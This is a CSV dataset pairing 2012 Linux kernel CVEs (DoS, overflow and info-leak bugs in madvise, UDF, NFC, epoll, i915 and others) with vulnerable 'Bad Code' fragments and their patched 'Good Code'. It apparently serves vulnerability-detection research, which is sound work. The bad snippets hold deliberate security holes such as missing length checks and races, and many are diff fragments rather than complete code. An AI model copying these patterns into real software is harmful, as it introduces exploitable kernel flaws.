Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2012,DoS ,CVE-2012-3511,"#include <linux/sched.h>
#include <linux/ksm.h>
#include <linux/fs.h>


/*
 * Any behaviour which results in changes to the vma->vm_flags needs to
{
 loff_t offset;
 int error;


	*prev = NULL;	/* tell sys_madvise we drop mmap_sem */

 if (vma->vm_flags & (VM_LOCKED|VM_NONLINEAR|VM_HUGETLB))
 return -EINVAL;

 if (!vma->vm_file || !vma->vm_file->f_mapping
		|| !vma->vm_file->f_mapping->host) {

 return -EINVAL;
	}

	offset = (loff_t)(start - vma->vm_start)
			+ ((loff_t)vma->vm_pgoff << PAGE_SHIFT);

 /* filesystem's fallocate may need to take i_mutex */






 up_read(&current->mm->mmap_sem);
	error = do_fallocate(vma->vm_file,
				FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
				offset, end - start);

 down_read(&current->mm->mmap_sem);
 return error;
}
","#include <linux/sched.h>
#include <linux/ksm.h>
#include <linux/fs.h>
#include <linux/file.h>

/*
 * Any behaviour which results in changes to the vma->vm_flags needs to
{
 loff_t offset;
 int error;
 struct file *f;

	*prev = NULL;	/* tell sys_madvise we drop mmap_sem */

 if (vma->vm_flags & (VM_LOCKED|VM_NONLINEAR|VM_HUGETLB))
 return -EINVAL;

	f = vma->vm_file;

 if (!f || !f->f_mapping || !f->f_mapping->host) {
 return -EINVAL;
	}

	offset = (loff_t)(start - vma->vm_start)
			+ ((loff_t)vma->vm_pgoff << PAGE_SHIFT);

 /*
	 * Filesystem's fallocate may need to take i_mutex.  We need to
	 * explicitly grab a reference because the vma (and hence the
	 * vma's reference to the file) can go away as soon as we drop
	 * mmap_sem.
 */
 get_file(f);
 up_read(&current->mm->mmap_sem);
	error = do_fallocate(f,
				FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
				offset, end - start);
 fput(f);
 down_read(&current->mm->mmap_sem);
 return error;
}
"
2012,DoS +Info ,CVE-2012-3510," */
void xacct_add_tsk(struct taskstats *stats, struct task_struct *p)
{


 /* convert pages-jiffies to Mbyte-usec */
	stats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;
	stats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;
 if (p->mm) {

 /* adjust to KB unit */
		stats->hiwater_rss   = p->mm->hiwater_rss * PAGE_SIZE / KB;
		stats->hiwater_vm    = p->mm->hiwater_vm * PAGE_SIZE / KB;

	}
	stats->read_char	= p->rchar;
	stats->write_char	= p->wchar;
"," */
void xacct_add_tsk(struct taskstats *stats, struct task_struct *p)
{
 struct mm_struct *mm;

 /* convert pages-jiffies to Mbyte-usec */
	stats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;
	stats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;
	mm = get_task_mm(p);
 if (mm) {
 /* adjust to KB unit */
		stats->hiwater_rss   = mm->hiwater_rss * PAGE_SIZE / KB;
		stats->hiwater_vm    = mm->hiwater_vm * PAGE_SIZE / KB;
 mmput(mm);
	}
	stats->read_char	= p->rchar;
	stats->write_char	= p->wchar;
"
2012,#NAME?,CVE-2012-3430,"
 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

 sin->sin_port = inc->i_hdr.h_sport;
 sin->sin_addr.s_addr = inc->i_saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));

		}
 break;
	}
","
 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

 sin->sin_port = inc->i_hdr.h_sport;
 sin->sin_addr.s_addr = inc->i_saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
			msg->msg_namelen = sizeof(*sin);
		}
 break;
	}
"
2012,DoS ,CVE-2012-3412," goto fail2;
	}






	efx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;
	rc = efx_probe_channels(efx);
 if (rc)
	net_dev->irq = efx->pci_dev->irq;
	net_dev->netdev_ops = &efx_netdev_ops;
 SET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);


 /* Clear MAC statistics */
	efx->mac_op->update_stats(efx);
efx_enqueue_skb(struct efx_tx_queue *tx_queue, struct sk_buff *skb);
extern void efx_xmit_done(struct efx_tx_queue *tx_queue, unsigned int index);
extern int efx_setup_tc(struct net_device *net_dev, u8 num_tc);


/* RX */
extern int efx_probe_rx_queue(struct efx_rx_queue *rx_queue);
#define EFX_MAX_EVQ_SIZE 16384UL
#define EFX_MIN_EVQ_SIZE 512UL

/* The smallest [rt]xq_entries that the driver supports. Callers of
 * efx_wake_queue() assume that they can subsequently send at least one
 * skb. Falcon/A1 may require up to three descriptors per skb_frag. */
#define EFX_MIN_RING_SIZE (roundup_pow_of_two(2 * 3 * MAX_SKB_FRAGS))






/* Filters */
extern int efx_probe_filters(struct efx_nic *efx);
 struct ethtool_ringparam *ring)
{
 struct efx_nic *efx = netdev_priv(net_dev);


 if (ring->rx_mini_pending || ring->rx_jumbo_pending ||
	    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||
	    ring->tx_pending > EFX_MAX_DMAQ_SIZE)
 return -EINVAL;

 if (ring->rx_pending < EFX_MIN_RING_SIZE ||
	    ring->tx_pending < EFX_MIN_RING_SIZE) {
 netif_err(efx, drv, efx->net_dev,
 ""TX and RX queues cannot be smaller than %ld\n"",
 EFX_MIN_RING_SIZE);
 return -EINVAL;
	}

 return efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);






}

static int efx_ethtool_set_pauseparam(struct net_device *net_dev,
#define FALCON_GMAC_LOOPBACKS			\
	(1 << LOOPBACK_GMAC)




/**
 * struct falcon_board_type - board operations and type information
 * @id: Board type id, as found in NVRAM
 return len;
}




















/*
 * Add a socket buffer to a TX queue
 *
"," goto fail2;
	}

 BUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);
 if (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {
		rc = -EINVAL;
 goto fail3;
	}
	efx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;
	rc = efx_probe_channels(efx);
 if (rc)
	net_dev->irq = efx->pci_dev->irq;
	net_dev->netdev_ops = &efx_netdev_ops;
 SET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);
	net_dev->gso_max_segs = EFX_TSO_MAX_SEGS;

 /* Clear MAC statistics */
	efx->mac_op->update_stats(efx);
efx_enqueue_skb(struct efx_tx_queue *tx_queue, struct sk_buff *skb);
extern void efx_xmit_done(struct efx_tx_queue *tx_queue, unsigned int index);
extern int efx_setup_tc(struct net_device *net_dev, u8 num_tc);
extern unsigned int efx_tx_max_skb_descs(struct efx_nic *efx);

/* RX */
extern int efx_probe_rx_queue(struct efx_rx_queue *rx_queue);
#define EFX_MAX_EVQ_SIZE 16384UL
#define EFX_MIN_EVQ_SIZE 512UL

/* Maximum number of TCP segments we support for soft-TSO */
#define EFX_TSO_MAX_SEGS 100

/* The smallest [rt]xq_entries that the driver supports.  RX minimum
 * is a bit arbitrary.  For TX, we must have space for at least 2
 * TSO skbs.
 */
#define EFX_RXQ_MIN_ENT 128U
#define EFX_TXQ_MIN_ENT(efx)	(2 * efx_tx_max_skb_descs(efx))

/* Filters */
extern int efx_probe_filters(struct efx_nic *efx);
 struct ethtool_ringparam *ring)
{
 struct efx_nic *efx = netdev_priv(net_dev);
	u32 txq_entries;

 if (ring->rx_mini_pending || ring->rx_jumbo_pending ||
	    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||
	    ring->tx_pending > EFX_MAX_DMAQ_SIZE)
 return -EINVAL;

 if (ring->rx_pending < EFX_RXQ_MIN_ENT) {

 netif_err(efx, drv, efx->net_dev,
 ""RX queues cannot be smaller than %u\n"",
 EFX_RXQ_MIN_ENT);
 return -EINVAL;
	}

	txq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));
 if (txq_entries != ring->tx_pending)
 netif_warn(efx, drv, efx->net_dev,
 ""increasing TX queue size to minimum of %u\n"",
			   txq_entries);

 return efx_realloc_channels(efx, ring->rx_pending, txq_entries);
}

static int efx_ethtool_set_pauseparam(struct net_device *net_dev,
#define FALCON_GMAC_LOOPBACKS			\
	(1 << LOOPBACK_GMAC)

/* Alignment of PCIe DMA boundaries (4KB) */
#define EFX_PAGE_SIZE 4096

/**
 * struct falcon_board_type - board operations and type information
 * @id: Board type id, as found in NVRAM
 return len;
}

unsigned int efx_tx_max_skb_descs(struct efx_nic *efx)
{
 /* Header and payload descriptor for each output segment, plus
	 * one for every input fragment boundary within a segment
 */
 unsigned int max_descs = EFX_TSO_MAX_SEGS * 2 + MAX_SKB_FRAGS;

 /* Possibly one more per segment for the alignment workaround */
 if (EFX_WORKAROUND_5391(efx))
		max_descs += EFX_TSO_MAX_SEGS;

 /* Possibly more for PCIe page boundaries within input fragments */
 if (PAGE_SIZE > EFX_PAGE_SIZE)
		max_descs += max_t(unsigned int, MAX_SKB_FRAGS,
 DIV_ROUND_UP(GSO_MAX_SIZE, EFX_PAGE_SIZE));

 return max_descs;
}

/*
 * Add a socket buffer to a TX queue
 *
"
2012,DoS Overflow ,CVE-2012-3400," struct genericPartitionMap *gpm;
 uint16_t ident;
 struct buffer_head *bh;

 int ret = 0;

	bh = udf_read_tagged(sb, block, block, &ident);
 if (!bh)
 return 1;
 BUG_ON(ident != TAG_IDENT_LVD);
	lvd = (struct logicalVolDesc *)bh->b_data;








	ret = udf_sb_alloc_partition_maps(sb, le32_to_cpu(lvd->numPartitionMaps));
 if (ret)
 goto out_bh;

 for (i = 0, offset = 0;
	     i < sbi->s_partitions && offset < le32_to_cpu(lvd->mapTableLength);
	     i++, offset += gpm->partitionMapLength) {
 struct udf_part_map *map = &sbi->s_partmaps[i];
		gpm = (struct genericPartitionMap *)
"," struct genericPartitionMap *gpm;
 uint16_t ident;
 struct buffer_head *bh;
 unsigned int table_len;
 int ret = 0;

	bh = udf_read_tagged(sb, block, block, &ident);
 if (!bh)
 return 1;
 BUG_ON(ident != TAG_IDENT_LVD);
	lvd = (struct logicalVolDesc *)bh->b_data;
	table_len = le32_to_cpu(lvd->mapTableLength);
 if (sizeof(*lvd) + table_len > sb->s_blocksize) {
 udf_err(sb, ""error loading logical volume descriptor: ""
 ""Partition table too long (%u > %lu)\n"", table_len,
			sb->s_blocksize - sizeof(*lvd));
 goto out_bh;
	}

	ret = udf_sb_alloc_partition_maps(sb, le32_to_cpu(lvd->numPartitionMaps));
 if (ret)
 goto out_bh;

 for (i = 0, offset = 0;
	     i < sbi->s_partitions && offset < table_len;
	     i++, offset += gpm->partitionMapLength) {
 struct udf_part_map *map = &sbi->s_partmaps[i];
		gpm = (struct genericPartitionMap *)
"
2012,DoS ,CVE-2012-3375," if (op == EPOLL_CTL_ADD) {
 if (is_file_epoll(tfile)) {
			error = -ELOOP;
 if (ep_loop_check(ep, tfile) != 0)

 goto error_tgt_fput;

		} else
 list_add(&tfile->f_tfile_llink, &tfile_check_list);
	}
"," if (op == EPOLL_CTL_ADD) {
 if (is_file_epoll(tfile)) {
			error = -ELOOP;
 if (ep_loop_check(ep, tfile) != 0) {
 clear_tfile_check_list();
 goto error_tgt_fput;
			}
		} else
 list_add(&tfile->f_tfile_llink, &tfile_check_list);
	}
"
2013,DoS Exec Code Overflow ,CVE-2012-3364,"	nfca_poll->sens_res = __le16_to_cpu(*((__u16 *)data));
	data += 2;

	nfca_poll->nfcid1_len = *data++;

 pr_debug(""sens_res 0x%x, nfcid1_len %d\n"",
		 nfca_poll->sens_res, nfca_poll->nfcid1_len);
 struct rf_tech_specific_params_nfcb_poll *nfcb_poll,
						     __u8 *data)
{
	nfcb_poll->sensb_res_len = *data++;

 pr_debug(""sensb_res_len %d\n"", nfcb_poll->sensb_res_len);

						     __u8 *data)
{
	nfcf_poll->bit_rate = *data++;
	nfcf_poll->sensf_res_len = *data++;

 pr_debug(""bit_rate %d, sensf_res_len %d\n"",
		 nfcf_poll->bit_rate, nfcf_poll->sensf_res_len);
 switch (ntf->activation_rf_tech_and_mode) {
 case NCI_NFC_A_PASSIVE_POLL_MODE:
		nfca_poll = &ntf->activation_params.nfca_poll_iso_dep;
		nfca_poll->rats_res_len = *data++;
 pr_debug(""rats_res_len %d\n"", nfca_poll->rats_res_len);
 if (nfca_poll->rats_res_len > 0) {
 memcpy(nfca_poll->rats_res,

 case NCI_NFC_B_PASSIVE_POLL_MODE:
		nfcb_poll = &ntf->activation_params.nfcb_poll_iso_dep;
		nfcb_poll->attrib_res_len = *data++;
 pr_debug(""attrib_res_len %d\n"", nfcb_poll->attrib_res_len);
 if (nfcb_poll->attrib_res_len > 0) {
 memcpy(nfcb_poll->attrib_res,
","	nfca_poll->sens_res = __le16_to_cpu(*((__u16 *)data));
	data += 2;

	nfca_poll->nfcid1_len = min_t(__u8, *data++, NFC_NFCID1_MAXSIZE);

 pr_debug(""sens_res 0x%x, nfcid1_len %d\n"",
		 nfca_poll->sens_res, nfca_poll->nfcid1_len);
 struct rf_tech_specific_params_nfcb_poll *nfcb_poll,
						     __u8 *data)
{
	nfcb_poll->sensb_res_len = min_t(__u8, *data++, NFC_SENSB_RES_MAXSIZE);

 pr_debug(""sensb_res_len %d\n"", nfcb_poll->sensb_res_len);

						     __u8 *data)
{
	nfcf_poll->bit_rate = *data++;
	nfcf_poll->sensf_res_len = min_t(__u8, *data++, NFC_SENSF_RES_MAXSIZE);

 pr_debug(""bit_rate %d, sensf_res_len %d\n"",
		 nfcf_poll->bit_rate, nfcf_poll->sensf_res_len);
 switch (ntf->activation_rf_tech_and_mode) {
 case NCI_NFC_A_PASSIVE_POLL_MODE:
		nfca_poll = &ntf->activation_params.nfca_poll_iso_dep;
		nfca_poll->rats_res_len = min_t(__u8, *data++, 20);
 pr_debug(""rats_res_len %d\n"", nfca_poll->rats_res_len);
 if (nfca_poll->rats_res_len > 0) {
 memcpy(nfca_poll->rats_res,

 case NCI_NFC_B_PASSIVE_POLL_MODE:
		nfcb_poll = &ntf->activation_params.nfcb_poll_iso_dep;
		nfcb_poll->attrib_res_len = min_t(__u8, *data++, 50);
 pr_debug(""attrib_res_len %d\n"", nfcb_poll->attrib_res_len);
 if (nfcb_poll->attrib_res_len > 0) {
 memcpy(nfcb_poll->attrib_res,
"
2012,DoS Overflow ,CVE-2012-2745," struct cred *new;
 int ret;



 if (
#ifdef CONFIG_KEYS
		!p->cred->thread_keyring &&
"," struct cred *new;
 int ret;

	p->replacement_session_keyring = NULL;

 if (
#ifdef CONFIG_KEYS
		!p->cred->thread_keyring &&
"
2012,DoS ,CVE-2012-2744,"
 /* all original skbs are linked into the NFCT_FRAG6_CB(head).orig */
	fp = skb_shinfo(head)->frag_list;
 if (NFCT_FRAG6_CB(fp)->orig == NULL)
 /* at above code, head skb is divided into two skbs. */
		fp = fp->next;

	hdr = ipv6_hdr(clone);
	fhdr = (struct frag_hdr *)skb_transport_header(clone);

 if (!(fhdr->frag_off & htons(0xFFF9))) {
 pr_debug(""Invalid fragment offset\n"");
 /* It is not a fragmented frame */
 goto ret_orig;
	}

 if (atomic_read(&nf_init_frags.mem) > nf_init_frags.high_thresh)
 nf_ct_frag6_evictor();

","
 /* all original skbs are linked into the NFCT_FRAG6_CB(head).orig */
	fp = skb_shinfo(head)->frag_list;
 if (fp && NFCT_FRAG6_CB(fp)->orig == NULL)
 /* at above code, head skb is divided into two skbs. */
		fp = fp->next;

	hdr = ipv6_hdr(clone);
	fhdr = (struct frag_hdr *)skb_transport_header(clone);







 if (atomic_read(&nf_init_frags.mem) > nf_init_frags.high_thresh)
 nf_ct_frag6_evictor();

"
2012,,CVE-2012-2669,"	pfd.fd = fd;

 while (1) {


		pfd.events = POLLIN;
		pfd.revents = 0;
 poll(&pfd, 1, -1);

		len = recv(fd, kvp_recv_buffer, sizeof(kvp_recv_buffer), 0);


 if (len < 0) {
 syslog(LOG_ERR, ""recv failed; error:%d"", len);

 close(fd);
 return -1;
		}
","	pfd.fd = fd;

 while (1) {
 struct sockaddr *addr_p = (struct sockaddr *) &addr;
 socklen_t addr_l = sizeof(addr);
		pfd.events = POLLIN;
		pfd.revents = 0;
 poll(&pfd, 1, -1);

		len = recvfrom(fd, kvp_recv_buffer, sizeof(kvp_recv_buffer), 0,
				addr_p, &addr_l);

 if (len < 0 || addr.nl_pid) {
 syslog(LOG_ERR, ""recvfrom failed; pid:%u error:%d %s"",
					addr.nl_pid, errno, strerror(errno));
 close(fd);
 return -1;
		}
"
2012,DoS ,CVE-2012-2390," kref_get(&reservations->refs);
}










static void hugetlb_vm_op_close(struct vm_area_struct *vma)
{
 struct hstate *h = hstate_vma(vma);
		reserve = (end - start) -
 region_count(&reservations->regions, start, end);

 kref_put(&reservations->refs, resv_map_release);

 if (reserve) {
 hugetlb_acct_memory(h, -reserve);
 set_vma_resv_flags(vma, HPAGE_RESV_OWNER);
	}

 if (chg < 0)
 return chg;



 /* There must be enough pages in the subpool for the mapping */
 if (hugepage_subpool_get_pages(spool, chg))
 return -ENOSPC;



 /*
	 * Check enough hugepages are available for the reservation.
	ret = hugetlb_acct_memory(h, chg);
 if (ret < 0) {
 hugepage_subpool_put_pages(spool, chg);
 return ret;
	}

 /*
 if (!vma || vma->vm_flags & VM_MAYSHARE)
 region_add(&inode->i_mapping->private_list, from, to);
 return 0;



}

void hugetlb_unreserve_pages(struct inode *inode, long offset, long freed)
"," kref_get(&reservations->refs);
}

static void resv_map_put(struct vm_area_struct *vma)
{
 struct resv_map *reservations = vma_resv_map(vma);

 if (!reservations)
 return;
 kref_put(&reservations->refs, resv_map_release);
}

static void hugetlb_vm_op_close(struct vm_area_struct *vma)
{
 struct hstate *h = hstate_vma(vma);
		reserve = (end - start) -
 region_count(&reservations->regions, start, end);

 resv_map_put(vma);

 if (reserve) {
 hugetlb_acct_memory(h, -reserve);
 set_vma_resv_flags(vma, HPAGE_RESV_OWNER);
	}

 if (chg < 0) {
		ret = chg;
 goto out_err;
	}

 /* There must be enough pages in the subpool for the mapping */
 if (hugepage_subpool_get_pages(spool, chg)) {
		ret = -ENOSPC;
 goto out_err;
	}

 /*
	 * Check enough hugepages are available for the reservation.
	ret = hugetlb_acct_memory(h, chg);
 if (ret < 0) {
 hugepage_subpool_put_pages(spool, chg);
 goto out_err;
	}

 /*
 if (!vma || vma->vm_flags & VM_MAYSHARE)
 region_add(&inode->i_mapping->private_list, from, to);
 return 0;
out_err:
 resv_map_put(vma);
 return ret;
}

void hugetlb_unreserve_pages(struct inode *inode, long offset, long freed)
"
2012,DoS Overflow ,CVE-2012-2384," return -EINVAL;
		}






		cliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),
				    GFP_KERNEL);
 if (cliprects == NULL) {
"," return -EINVAL;
		}

 if (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {
 DRM_DEBUG(""execbuf with %u cliprects\n"",
				  args->num_cliprects);
 return -EINVAL;
		}
		cliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),
				    GFP_KERNEL);
 if (cliprects == NULL) {
"
2012,DoS Overflow ,CVE-2012-2383," struct drm_i915_gem_exec_object2 *exec2_list = NULL;
 int ret;

 if (args->buffer_count < 1) {

 DRM_DEBUG(""execbuf2 with %d buffers\n"", args->buffer_count);
 return -EINVAL;
	}
"," struct drm_i915_gem_exec_object2 *exec2_list = NULL;
 int ret;

 if (args->buffer_count < 1 ||
	    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {
 DRM_DEBUG(""execbuf2 with %d buffers\n"", args->buffer_count);
 return -EINVAL;
	}
"
2012,DoS ,CVE-2012-2375," if (acl_len > buflen)
 goto out_free;
 _copy_from_pages(buf, pages, res.acl_data_offset,
 res.acl_len);
	}
	ret = acl_len;
out_free:
"," if (acl_len > buflen)
 goto out_free;
 _copy_from_pages(buf, pages, res.acl_data_offset,
				acl_len);
	}
	ret = acl_len;
out_free:
"
2012,DoS ,CVE-2012-2373,"	ptep->pte_low = pte.pte_low;
}



















































static inline void native_set_pte_atomic(pte_t *ptep, pte_t pte)
{
 set_64bit((unsigned long long *)(ptep), native_pte_val(pte));
#endif /* __HAVE_ARCH_PMD_WRITE */
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */













/*
 * This function is meant to be used by sites walking pagetables with
 * the mmap_sem hold in read mode to protect against MADV_DONTNEED and
 * undefined so behaving like if the pmd was none is safe (because it
 * can return none anyway). The compiler level barrier() is critically
 * important to compute the two checks atomically on the same pmdval.







 */
static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t *pmd)
{
 /* depend on compiler for an atomic pmd read */
 pmd_t pmdval = *pmd;
 /*
	 * The barrier will stabilize the pmdval in a register or on
	 * the stack so that it will stop changing under the code.
","	ptep->pte_low = pte.pte_low;
}

#define pmd_read_atomic pmd_read_atomic
/*
 * pte_offset_map_lock on 32bit PAE kernels was reading the pmd_t with
 * a ""*pmdp"" dereference done by gcc. Problem is, in certain places
 * where pte_offset_map_lock is called, concurrent page faults are
 * allowed, if the mmap_sem is hold for reading. An example is mincore
 * vs page faults vs MADV_DONTNEED. On the page fault side
 * pmd_populate rightfully does a set_64bit, but if we're reading the
 * pmd_t with a ""*pmdp"" on the mincore side, a SMP race can happen
 * because gcc will not read the 64bit of the pmd atomically. To fix
 * this all places running pmd_offset_map_lock() while holding the
 * mmap_sem in read mode, shall read the pmdp pointer using this
 * function to know if the pmd is null nor not, and in turn to know if
 * they can run pmd_offset_map_lock or pmd_trans_huge or other pmd
 * operations.
 *
 * Without THP if the mmap_sem is hold for reading, the
 * pmd can only transition from null to not null while pmd_read_atomic runs.
 * So there's no need of literally reading it atomically.
 *
 * With THP if the mmap_sem is hold for reading, the pmd can become
 * THP or null or point to a pte (and in turn become ""stable"") at any
 * time under pmd_read_atomic, so it's mandatory to read it atomically
 * with cmpxchg8b.
 */
#ifndef CONFIG_TRANSPARENT_HUGEPAGE
static inline pmd_t pmd_read_atomic(pmd_t *pmdp)
{
 pmdval_t ret;
	u32 *tmp = (u32 *)pmdp;

	ret = (pmdval_t) (*tmp);
 if (ret) {
 /*
		 * If the low part is null, we must not read the high part
		 * or we can end up with a partial pmd.
 */
 smp_rmb();
		ret |= ((pmdval_t)*(tmp + 1)) << 32;
	}

 return (pmd_t) { ret };
}
#else /* CONFIG_TRANSPARENT_HUGEPAGE */
static inline pmd_t pmd_read_atomic(pmd_t *pmdp)
{
 return (pmd_t) { atomic64_read((atomic64_t *)pmdp) };
}
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */

static inline void native_set_pte_atomic(pte_t *ptep, pte_t pte)
{
 set_64bit((unsigned long long *)(ptep), native_pte_val(pte));
#endif /* __HAVE_ARCH_PMD_WRITE */
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */

#ifndef pmd_read_atomic
static inline pmd_t pmd_read_atomic(pmd_t *pmdp)
{
 /*
	 * Depend on compiler for an atomic pmd read. NOTE: this is
	 * only going to work, if the pmdval_t isn't larger than
	 * an unsigned long.
 */
 return *pmdp;
}
#endif

/*
 * This function is meant to be used by sites walking pagetables with
 * the mmap_sem hold in read mode to protect against MADV_DONTNEED and
 * undefined so behaving like if the pmd was none is safe (because it
 * can return none anyway). The compiler level barrier() is critically
 * important to compute the two checks atomically on the same pmdval.
 *
 * For 32bit kernels with a 64bit large pmd_t this automatically takes
 * care of reading the pmd atomically to avoid SMP race conditions
 * against pmd_populate() when the mmap_sem is hold for reading by the
 * caller (a special atomic read not done by ""gcc"" as in the generic
 * version above, is also needed when THP is disabled because the page
 * fault can populate the pmd from under us).
 */
static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t *pmd)
{
 pmd_t pmdval = pmd_read_atomic(pmd);

 /*
	 * The barrier will stabilize the pmdval in a register or on
	 * the stack so that it will stop changing under the code.
"
